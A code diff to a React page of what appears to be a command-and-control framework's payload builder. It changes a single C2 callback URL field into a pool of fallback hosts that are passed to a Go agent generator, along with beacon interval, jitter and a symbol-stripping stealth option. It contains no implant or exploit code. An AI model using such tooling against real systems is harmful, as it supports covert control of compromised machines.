@@ -3,10 +3,10 @@ import { payloadsApi } from '../utils/api';
 import { Download, Cpu, Loader2, CheckCircle, AlertCircle, Globe, Terminal as TerminalIcon } from 'lucide-react';
 
 const PayloadPage = () => {
-  const [serverUrl, setServerUrl] = useState(() => {
+  const [serverUrls, setServerUrls] = useState(() => {
     const host = window.location.hostname;
     const protocol = window.location.protocol;
-    return `${protocol}//${host}:3001`;
+    return [`${protocol}//${host}:3001`];
   });
   const [platform, setPlatform] = useState('windows');
   const [interval, setIntervalVal] = useState(10);
@@ -22,7 +22,7 @@ const PayloadPage = () => {
       "[*] Initializing Go compilation environment...",
       "[*] Pulling ByteCode agent source v2.4.0...",
       "[*] Injecting C2 configuration into internal/config/config.go...",
-      `[*] Setting C2_URL = ${serverUrl}`,
+      `[*] Setting C2_URL = ${serverUrls[0]}`,
       `[*] Setting BEACON_INTERVAL = ${interval}s`,
       `[*] Setting JITTER = ${jitter}%`,
       "[*] Resolving dependencies...",
@@ -50,7 +50,7 @@ const PayloadPage = () => {
     try {
       // Simulate backend delay for log effect
       await new Promise(r => setTimeout(r, 4500));
-      const data = await payloadsApi.generate(serverUrl, showGui, interval, jitter);
+      const data = await payloadsApi.generate(serverUrls.join(','), showGui, interval, jitter);
       setResult(data);
     } catch (err) {
       setError(err.message);
@@ -102,17 +102,42 @@ const PayloadPage = () => {
                 </div>
               </div>
 
-              <div className="space-y-2">
-                <label className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">C2 Callback URL</label>
-                <div className="relative">
-                  <Globe className="absolute left-3 top-2.5 w-3.5 h-3.5 text-slate-600" />
-                  <input
-                    type="text"
-                    value={serverUrl}
-                    onChange={(e) => setServerUrl(e.target.value)}
-                    className="w-full bg-slate-950/50 border border-slate-800 rounded-lg pl-9 pr-4 py-2 text-xs text-white outline-none focus:border-primary/50 font-mono"
-                  />
+              <div className="space-y-3">
+                <div className="flex items-center justify-between">
+                  <label className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">C2 Infrastructure Pool</label>
+                  <button 
+                    type="button"
+                    onClick={() => setServerUrls([...serverUrls, ''])}
+                    className="text-[9px] font-black text-primary uppercase tracking-widest hover:text-white transition-colors"
+                  >
+                    + Add Host
+                  </button>
                 </div>
+                {serverUrls.map((url, idx) => (
+                  <div key={idx} className="relative group">
+                    <Globe className="absolute left-3 top-2.5 w-3.5 h-3.5 text-slate-600 group-focus-within:text-primary transition-colors" />
+                    <input
+                      type="text"
+                      value={url}
+                      onChange={(e) => {
+                        const newUrls = [...serverUrls];
+                        newUrls[idx] = e.target.value;
+                        setServerUrls(newUrls);
+                      }}
+                      className="w-full bg-slate-950/50 border border-slate-800 rounded-lg pl-9 pr-10 py-2 text-xs text-white outline-none focus:border-primary/50 font-mono transition-all"
+                      placeholder="https://c2-node.com"
+                    />
+                    {serverUrls.length > 1 && (
+                      <button 
+                        type="button"
+                        onClick={() => setServerUrls(serverUrls.filter((_, i) => i !== idx))}
+                        className="absolute right-3 top-2.5 text-slate-600 hover:text-red-400 transition-colors"
+                      >
+                        <AlertCircle className="w-3.5 h-3.5 rotate-45" />
+                      </button>
+                    )}
+                  </div>
+                ))}
               </div>
 
               <div className="grid grid-cols-2 gap-4">
@@ -164,10 +189,10 @@ const PayloadPage = () => {
             <pre className="text-[10px] font-mono text-primary/70 bg-black/40 p-4 rounded-lg border border-primary/10 overflow-x-auto">
 {JSON.stringify({
   target: platform,
-  c2: serverUrl,
+  c2_pool: serverUrls,
   timing: { interval: `${interval}s`, jitter: `${jitter}%` },
   stealth: showGui ? "DEBUG_ENABLED" : "STRIP_SYMBOLS",
-  build: "v2.4.0-stable"
+  build: "v2.5.0-stable"
 }, null, 2)}
             </pre>
           </div>
